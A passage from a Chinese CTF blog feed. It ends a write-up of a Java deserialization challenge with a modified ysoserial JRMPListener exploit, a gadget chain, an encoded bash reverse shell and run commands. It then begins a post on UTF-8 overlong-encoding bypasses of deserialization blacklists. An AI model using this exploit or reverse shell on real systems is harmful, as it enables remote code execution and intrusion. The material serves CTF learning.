class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IOException e ) &#123;&#125;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//exp部分</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        objo.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">obji</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        obji.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[][] generateEvilBytes() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL2lwLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        <span class="hljs-comment">// 修改为自己的ip port</span><br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[][] evilbyte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;;<br><br>        <span class="hljs-keyword">return</span> evilbyte;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String fname,T f)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(fname);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        filed.set(obj,f);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        if ( args.length &lt; 3 ) &#123;</span><br><span class="hljs-comment">//            System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="hljs-comment">//            System.exit(-1);</span><br><span class="hljs-comment">//            return;</span><br><span class="hljs-comment">//        &#125;</span><br><br><span class="hljs-comment">//        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);</span><br>        <span class="hljs-comment">// 删除writeReplace</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">wt</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(wt);<br>        ctClass0.toClass();<br><br>        <span class="hljs-comment">//构造恶意TemplatesImpl</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(tmp,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setValue(tmp,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setValue(tmp,<span class="hljs-string">&quot;_bytecodes&quot;</span>,generateEvilBytes());<br><br>        <span class="hljs-comment">//稳定触发</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">support</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        support.setTarget(tmp);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(support);<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,handler);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objmapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">ArrayNode</span> <span class="hljs-variable">arrayNode</span> <span class="hljs-operator">=</span>objmapper.createArrayNode();<br>        arrayNode.addPOJO(proxy);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//反射绕过构造方法限制</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(ex,arrayNode);<br><br>        Object payloadObject=ex;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(args[ <span class="hljs-number">0</span> ]);<br>            System.err.println(<span class="hljs-string">&quot;* Opening JRMP listener on &quot;</span> + port);<br>            <span class="hljs-type">JRMPListener</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>(port, payloadObject);<br>            c.run();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Listener error&quot;</span>);<br>            e.printStackTrace(System.err);<br>        &#125;<br><span class="hljs-comment">//        Utils.releasePayload(args[1], payloadObject);</span><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">this</span>.exit &amp;&amp; ( s = <span class="hljs-built_in">this</span>.ss.accept() ) != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();<br>                        System.err.println(<span class="hljs-string">&quot;Have connection from &quot;</span> + remote);<br><br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is);<br><br>                        <span class="hljs-comment">// Read magic (or HTTP wrapper)</span><br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br><br>                        <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                        <span class="hljs-keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;<br>                            s.close();<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                        <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br><br>                        <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                        <span class="hljs-keyword">switch</span> ( protocol ) &#123;<br>                            <span class="hljs-keyword">case</span> TransportConstants.StreamProtocol:<br>                                out.writeByte(TransportConstants.ProtocolAck);<br>                                <span class="hljs-keyword">if</span> ( remote.getHostName() != <span class="hljs-literal">null</span> ) &#123;<br>                                    out.writeUTF(remote.getHostName());<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    out.writeUTF(remote.getAddress().toString());<br>                                &#125;<br>                                out.writeInt(remote.getPort());<br>                                out.flush();<br>                                in.readUTF();<br>                                in.readInt();<br>                            <span class="hljs-keyword">case</span> TransportConstants.SingleOpProtocol:<br>                                doMessage(s, in, out, <span class="hljs-built_in">this</span>.payloadObject);<br>                                <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">default</span>:<br>                            <span class="hljs-keyword">case</span> TransportConstants.MultiplexProtocol:<br>                                System.err.println(<span class="hljs-string">&quot;Unsupported protocol&quot;</span>);<br>                                s.close();<br>                                <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        bufOut.flush();<br>                        out.flush();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>                        e.printStackTrace(System.err);<br>                    &#125;<br>                    <span class="hljs-keyword">finally</span> &#123;<br>                        System.err.println(<span class="hljs-string">&quot;Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br><br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> ( s != <span class="hljs-literal">null</span> ) &#123;<br>                    s.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( SocketException e ) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span> <span class="hljs-params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.err.println(<span class="hljs-string">&quot;Reading message...&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br><br>        <span class="hljs-keyword">switch</span> ( op ) &#123;<br>            <span class="hljs-keyword">case</span> TransportConstants.Call:<br>                <span class="hljs-comment">// service incoming RMI call</span><br>                doCall(in, out, payload);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.Ping:<br>                <span class="hljs-comment">// send ack for ping</span><br>                out.writeByte(TransportConstants.PingAck);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.DGCAck:<br>                <span class="hljs-type">UID</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> UID.read(in);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span> <span class="hljs-params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID.read(ois);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( java.io.IOException e ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> ( read.hashCode() == <span class="hljs-number">2</span> ) &#123;<br>            ois.readInt(); <span class="hljs-comment">// method</span><br>            ois.readLong(); <span class="hljs-comment">// hash</span><br>            System.err.println(<span class="hljs-string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Sending return with payload for obj &quot;</span> + read);<br><br>        out.writeByte(TransportConstants.Return);<span class="hljs-comment">// transport op</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="hljs-built_in">this</span>.classpathUrl);<br><br>        oos.writeByte(TransportConstants.ExceptionalReturn);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>().write(oos);<br><br><span class="hljs-comment">//        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        Reflections.setFieldValue(ex, &quot;val&quot;, payload);</span><br>        oos.writeObject(payload);<span class="hljs-comment">//直接写成型的payload过去即可</span><br><br>        oos.flush();<br>        out.flush();<br><br>        <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;deprecation&quot;&#125;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeDummyObject</span> <span class="hljs-params">(String className)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">isolation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;&#125;;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Dummy.class));<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cp.get(Dummy.class.getName());<br>            clazz.setName(className);<br>            <span class="hljs-keyword">return</span> clazz.toClass(isolation).newInstance();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dummy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后使用该命令重新打包一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests  <span class="hljs-comment"># 这里不跳过测试会报错，因为不知道版本原因还是怎么的很多依赖和插件爆红</span><br></code></pre></td></tr></table></figure><p>然后用下面的命令开启JRMP服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 80<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026144410160.png" alt="image-20241026144410160"></p><p>然后此时打exp反弹shell</p><p>exp执行命令如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python .\exp.py <span class="hljs-string">&quot;http://7ae47afd-3eda-472c-9c1b-7ce01d6a534f.node5.buuoj.cn&quot;</span> <span class="hljs-string">&quot;&lt;vps地址&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026153215483.png" alt="image-20241026153215483"></p><p><img src="https://cdn.clown2024.cn/image-20241026153245566.png" alt="image-20241026153245566"></p><p><img src="https://cdn.clown2024.cn/image-20241026153257626.png" alt="image-20241026153257626"></p><p>弹shell过来拿到flag</p><blockquote><p>艹了打exp的时候一直写错服务器地址蠢了，多加了一个http:&#x2F;&#x2F;，直接写ip就行了</p><p>还有一点是rmi:&#x2F;&#x2F;&lt;服务器地址&gt;&#x2F;a 这里要加一个访问路径，不然也会收不到payload，这我在本地测试过，我也不清楚为啥，可以跟JRMP的模块实现有关，这部分后面学习JRMP模块的时候再探究一下</p></blockquote><p>这题复现真的曲折，wp写的过于简略让我这个菜鸡看不太懂😭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;官方wp链接：&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS&quot;&gt;https://www.yuque.com/chuangfeimeiyige</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UTF-8 Overlong Encoding绕过学习</title>
    <link href="https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-20T12:39:41.000Z</published>
    <updated>2024-10-22T14:14:03.669Z</updated>
    
    <content type="html"><![CDATA[<p>之前只是浅浅的知道这个东西，现在来深入学习一下，因为在java题目中有时会用到该方法来进行绕过</p><h1 id="utf-8编码过程"><a href="#UTF-8编码过程" class="headerlink" title="UTF-8编码过程"></a>UTF-8编码过程</h1><p>UTF-8（8-bit Unicode Transformation Format）是一种用于编码Unicode字符的可变长度字符编码方案。它能够表示Unicode字符集中的每个字符，并且与ASCII编码兼容。</p><p>它可以将Unicode里的所有字符转换成1到4个字节来表示</p><p>下面是一个Unicode对应UTF-8的转换表</p><p><img src="https://cdn.clown2024.cn/202410202132477.png" alt="image-20241020213226571"></p><ul><li>常见的ASCII字符（U+0000到U+007F）用1个字节表示。</li><li>其他Unicode字符根据其范围使用2到4个字节。</li></ul><p>以欧元符号€来举例，该符号的Unicode编码为U+20AC，位于U+0800和U+FFFF之间，所以为三个字节，编码长度为3，0x20AC的二进制为<strong>10 0000 1010 1100</strong></p><p>然后根据每个字节缺的位数，从左至右按顺序分成三组，第一组长度不满在前面补零：0010，000010，101100</p><p>然后填进去，转换成十六进制，欧元符号的UTF-8编码就是<strong>\xE2\x82\xAC</strong></p><p>python来decode验证一下</p><p><img src="https://cdn.clown2024.cn/202410202147505.png" alt="image-20241020214652039"></p><h1 id="overlong-encoding绕过原理"><a href="#Overlong-Encoding绕过原理" class="headerlink" title="Overlong Encoding绕过原理"></a>Overlong Encoding绕过原理</h1><p>Overlong Encoding就是将一个字节的字符按照UTF-8的编码形式强行编码成两个字符</p><p>比如”.”这个字符正常Unicode编码为0x2E，按照utf-8的形式只能被编码为一个字节，但是我们可以按照两个字节的编码形式，通过补0强行分成两组</p><p>0x2E的二进制是10 1110，现在直接前面补5个0，变成00000 101110这样的两组，然后他的UTF-8的编码形式就变成<strong>\xC0\xAE</strong></p><p>但是这个编码并不是一个合法的UTF-8编码，有些语言在转换的时候会进行检查比如python；而有些则对该检查存在缺陷，导致能够正常解析出来，比如java，这就造成<strong>Overlong Encoding绕过</strong></p><p>python进行解码的话会报下面的错误</p><p><img src="https://cdn.clown2024.cn/202410202204297.png" alt="image-20241020220411264"></p><p>会直接说非法字节，无法转换编码</p><p>该绕过方式会在一些目录穿越的时候用到，比如用%C0%AE来代替.，来绕过对目录穿越的限制，原因就是该服务在路径解码时使用UTF-8编码</p><h1 id="overlong-encoding在java中的绕过利用"><a href="#Overlong-Encoding在java中的绕过利用" class="headerlink" title="Overlong Encoding在java中的绕过利用"></a>Overlong Encoding在java中的绕过利用</h1><p>在java的waf中通常是检查序列化的字节流中是否有敏感类来进行过滤，比如重写resolveClass来添加黑名单，如果能够进行二次反序列化可能有机会绕过一些关键类，但如果禁用得太死就轮到Overlong Encoding方法来大显身手了。</p><h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们知道在序列化的时候，类名是直接明文可读，waf检测也是基于此形式，那绕过的思路就是利用Overlong Encoding来编码这些类名，让其不可见从而绕过检测</p><p>那现在就去看看java反序列化时是怎么读取类名，分析为什么我们可以绕过</p><p>这里尝试自己调了一下，发现不太好调(主要是太菜了🥲)，1ue师傅的文章给出了调用栈，就不重头自己调了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectStreamClass#readNonProxy(ObjectInputStream in)<br>ObjectInputStream#readUTF()<br>BlockDataInputStream#readUTF()<br>ObjectInputStream#readUTFBody(long utflen)<br>ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)<br></code></pre></td></tr></table></figure><p>直接断在readNonProxy方法的调用处</p><p><img src="https://cdn.clown2024.cn/202410202345526.png" alt="image-20241020234544465"></p><p>看一下idea的调用栈，大概知道一下怎么来到这里的</p><p><img src="https://cdn.clown2024.cn/202410202346567.png" alt="image-20241020234623530"></p><p>然后跟进readNonProxy方法</p><p><img src="https://cdn.clown2024.cn/202410202347133.png" alt="image-20241020234726090"></p><p>可以看到类名的读取就是用readUTF方法</p><p>然后直接走到比较关键的ObjectInputStream#readUTFBody方法里面</p><p><img src="https://cdn.clown2024.cn/202410202354104.png" alt="image-20241020235420062"></p><p>最后的读取实现逻辑就在这两个方法里面，这两个方法里面读取字节的关键逻辑是一样的，看其中一个即可</p><p>这里看一下readUTFSpan方法的逻辑，该方法就是根据utflen去获取classname的值并返回到sbuf中</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-title function_">readUTFSpan</span><span class="hljs-params">(StringBuilder sbuf, <span class="hljs-type">long</span> utflen)</span><br>            <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cpos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> pos;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">avail</span> <span class="hljs-operator">=</span> Math.min(end - pos, CHAR_BUF_SIZE);<br>            <span class="hljs-comment">// stop short of last char unless all of utf bytes in buffer</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">stop</span> <span class="hljs-operator">=</span> pos + ((utflen &gt; avail) ? avail - <span class="hljs-number">2</span> : (<span class="hljs-type">int</span>) utflen);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">outOfBounds</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> (pos &lt; stop) &#123;<br>                    <span class="hljs-type">int</span> b1, b2, b3;<br>                    b1 = buf[pos++] &amp; <span class="hljs-number">0xFF</span>;<br>                    <span class="hljs-keyword">switch</span> (b1 &gt;&gt; <span class="hljs-number">4</span>) &#123;<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:   <span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br>                            <span 